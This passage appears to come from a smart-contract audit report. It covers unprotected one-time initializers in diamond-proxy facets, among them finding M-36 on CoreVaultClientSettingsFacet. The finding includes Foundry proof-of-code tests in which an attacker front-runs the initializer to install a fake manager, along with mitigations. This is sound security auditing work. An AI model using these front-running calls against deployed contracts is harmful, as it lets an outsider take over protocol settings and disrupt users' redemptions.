        // Deploy facet implementation whose selectors will be routed by the diamond
        facetImpl = new RedemptionTimeExtensionFacet();

        // Prepare diamond cut to add the facet selectors we need
        bytes4[] memory selectors = new bytes4[](3);
        selectors[0] = RedemptionTimeExtensionFacet.initRedemptionTimeExtensionFacet.selector;
        selectors[1] = RedemptionTimeExtensionFacet.setRedemptionPaymentExtensionSeconds.selector;
        selectors[2] = RedemptionTimeExtensionFacet.redemptionPaymentExtensionSeconds.selector;

        IDiamondCut.FacetCut[] memory cut = new IDiamondCut.FacetCut[](1);
        cut[0] = IDiamondCut.FacetCut({
            facetAddress: address(facetImpl),
            action: IDiamondCut.FacetCutAction.Add,
            functionSelectors: selectors
        });

        // Initialize the diamond (sets governance + ERC165 flags so facet init won't revert)
        DiamondInit init = new DiamondInit();
        bytes memory initData = abi.encodeCall(DiamondInit.init, (IGovernanceSettings(address(1)), address(this)));

        // Deploy AssetManager diamond with our initial cut and init
        diamond = new AssetManager(cut, address(init), initData);
    }

    function test_AttackerCanPermissionlesslyInitializeFacet() public {
        // Attacker front-runs the facet initializer on the diamond
        vm.prank(attacker);
        RedemptionTimeExtensionFacet(address(diamond)).initRedemptionTimeExtensionFacet(365 days);

        // Assert the global parameter reflects attacker-chosen value
        uint256 ext = IRedemptionTimeExtensionView(address(diamond)).redemptionPaymentExtensionSeconds();
        assertEq(ext, 365 days, "extension not set by attacker");

        // Second init attempt reverts (one-time init burned by attacker)
        vm.expectRevert();
        RedemptionTimeExtensionFacet(address(diamond)).initRedemptionTimeExtensionFacet(1);
    }
}

interface IGovernanceSettings { }

## Suggested Mitigation
Make initRedemptionTimeExtensionFacet governance-gated (e.g., onlyAssetManagerController/onlyGovernance) and call it atomically via the diamond cut’s _init delegatecall when adding the facet, not as a publicly callable external initializer. Alternatively, remove the external initializer entirely and set a safe default during the AssetManager’s main init. As defense-in-depth, require non-zero and clamp the initial value to sane bounds.





 **Derived From** : Unprotected initializer lets anyone set CoreVault manager and parameters

## [M-36]. Permissionless one-time initializer in CoreVaultClientSettingsFacet allows arbitrary CoreVault manager and params to be set

## Derived From Pattern/Invariant
Unprotected initializer lets anyone set CoreVault manager and parameters

## Exploit Type
UpgradeabilityInitializerSafety

## Location
CoreVaultClientSettingsFacet.initCoreVaultFacet

## Minimim Privilege Required
Permissionless

## Description
CoreVaultClientSettingsFacet.initCoreVaultFacet() is external, lacks any governance/auth modifier, and performs one-time initialization guarded only by an internal initialized flag stored in the diamond’s CoreVaultClient.State. Any EOA can front-run governance immediately after the facet is added and call initCoreVaultFacet to set attacker-controlled coreVaultManager, nativeAddress, redemption fee BIPS, time extension, and thresholds. The function also omits the critical validation present in setCoreVaultManager (coreVaultManager.assetManager() == address(this)), enabling a bogus/malicious manager. During this window CoreVaultClientFacet is effectively "enabled" against an untrusted manager, risking DoS/misrouting until governance manually repairs settings. Vulnerable snippet:

function initCoreVaultFacet(IICoreVaultManager _coreVaultManager, address payable _nativeAddress, uint256 _transferTimeExtensionSeconds, uint256 _redemptionFeeBIPS, uint256 _minimumAmountLeftBIPS, uint256 _minimumRedeemLots) external { ... require(!state.initialized, AlreadyInitialized()); state.initialized = true; state.coreVaultManager = _coreVaultManager; // no auth, no assetManager() check ... }

## Impact
Unprivileged caller can permanently flip the Core Vault feature to initialized and point it to an arbitrary manager and parameters. Until governance fixes, CoreVaultClientFacet may operate against a malicious/wrong manager causing DoS (failed requests, stuck reservations) or misrouting of Core Vault interactions. This can affect redemption/return liveness and agents’ operations.

## Proof of Concept
1) Governance deploys/diamond-cuts CoreVaultClientSettingsFacet into the AssetManager diamond but has not initialized it yet.
2) Attacker calls initCoreVaultFacet on the diamond, setting coreVaultManager to an arbitrary address (can be EOAs or a malicious contract) and arbitrary parameters. The function succeeds because it has no auth and only checks local initialized flag.
3) Core Vault feature becomes effectively enabled with wrong manager; CoreVaultClientFacet calls that rely on the manager will be routed to the attacker’s address (or revert), breaking agent flows and availability until governance reconfigures.
4) Governance cannot re-run initCoreVaultFacet (AlreadyInitialized), must repair via setters later.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Diamond} from "contracts/diamond/implementation/Diamond.sol";
import {DiamondInit} from "contracts/diamond/mock/DiamondInit.sol";
import {DiamondCutFacet as MockDiamondCutFacet} from "contracts/diamond/mock/DiamondCutFacet.sol";
import {IDiamondCut} from "contracts/diamond/interfaces/IDiamondCut.sol";
import {CoreVaultClientSettingsFacet} from "contracts/assetManager/facets/CoreVaultClientSettingsFacet.sol";
import {IICoreVaultManager} from "contracts/userInterfaces/ICoreVaultManager.sol";
import {ICoreVaultClientSettings} from "contracts/userInterfaces/ICoreVaultClientSettings.sol";

contract InitCoreVaultFacet_ExploitTest is Test {
    address governance = address(0xA11CE);
    address attacker = address(0xBEEF);

    Diamond diamond;
    DiamondInit diamondInit;
    MockDiamondCutFacet cutFacet;

    function setUp() public {
        // Deploy helper facets
        diamondInit = new DiamondInit();
        cutFacet = new MockDiamondCutFacet();

        // Install DiamondCut into fresh Diamond and run DiamondInit.init to set IERC165 flag and governance
        IDiamondCut.FacetCut[] memory initCut = new IDiamondCut.FacetCut[](1);
        bytes4[] memory selectors = new bytes4[](1);
        selectors[0] = IDiamondCut.diamondCut.selector;
        initCut[0] = IDiamondCut.FacetCut({
            facetAddress: address(cutFacet),
            action: IDiamondCut.FacetCutAction.Add,
            functionSelectors: selectors
        });
        bytes memory initData = abi.encodeWithSelector(DiamondInit.init.selector, address(0), governance);
        diamond = new Diamond(initCut, address(diamondInit), initData);

        // Add CoreVaultClientSettingsFacet (only the functions we need)
        CoreVaultClientSettingsFacet settingsFacet = new CoreVaultClientSettingsFacet();
        IDiamondCut.FacetCut[] memory cvCut = new IDiamondCut.FacetCut[](1);
        bytes4[] memory cvSelectors = new bytes4[](2);
        cvSelectors[0] = CoreVaultClientSettingsFacet.initCoreVaultFacet.selector;
        cvSelectors[1] = CoreVaultClientSettingsFacet.getCoreVaultManager.selector; // to verify state
        cvCut[0] = IDiamondCut.FacetCut({
            facetAddress: address(settingsFacet),
            action: IDiamondCut.FacetCutAction.Add,
            functionSelectors: cvSelectors
        });
        vm.prank(governance);
        IDiamondCut(address(diamond)).diamondCut(cvCut, address(0), "");
    }

    function test_AttackerCanInitializeCoreVaultFacet() public {
        // Attacker initializes with arbitrary manager and params
        IICoreVaultManager fakeMgr = IICoreVaultManager(address(0xDeaDBeEF));
        vm.prank(attacker);
        (bool ok, ) = address(diamond).call(
            abi.encodeWithSelector(
                CoreVaultClientSettingsFacet.initCoreVaultFacet.selector,
                fakeMgr,
                payable(address(0xB0B)),
                uint256(7200),    // transfer time extension seconds
                uint256(100),     // redemptionFeeBIPS
                uint256(500),     // minimumAmountLeftBIPS
                uint256(1)        // minimumRedeemLots
            )
        );
        require(ok, "init failed");

        // Verify attacker-controlled manager is now set
        (bool ok2, bytes memory out) = address(diamond).call(
            abi.encodeWithSelector(CoreVaultClientSettingsFacet.getCoreVaultManager.selector)
        );
        require(ok2, "getCoreVaultManager failed");
        address mgr = abi.decode(out, (address));
        assertEq(mgr, address(fakeMgr));

        // Re-initialization must fail (one-time initializer flipped)
        vm.prank(governance);
        (bool ok3, ) = address(diamond).call(
            abi.encodeWithSelector(
                CoreVaultClientSettingsFacet.initCoreVaultFacet.selector,
                IICoreVaultManager(address(1)),
                payable(address(1)),
                uint256(0),
                uint256(0),
                uint256(0),
                uint256(0)
            )
        );
        require(!ok3, "should revert: AlreadyInitialized");
    }
}


## Suggested Mitigation
Treat initCoreVaultFacet as an initializer restricted to governance: add onlyGovernance (or onlyGovernanceWithTimelock if desired) and ensure it can only run once. Additionally, mirror the validation in setCoreVaultManager by requiring _coreVaultManager.assetManager() == address(this) and _coreVaultManager != address(0). Consider removing public exposure of this initializer entirely and wiring it through a diamondCut _init delegatecall executed by governance during the same transaction that adds the facet.



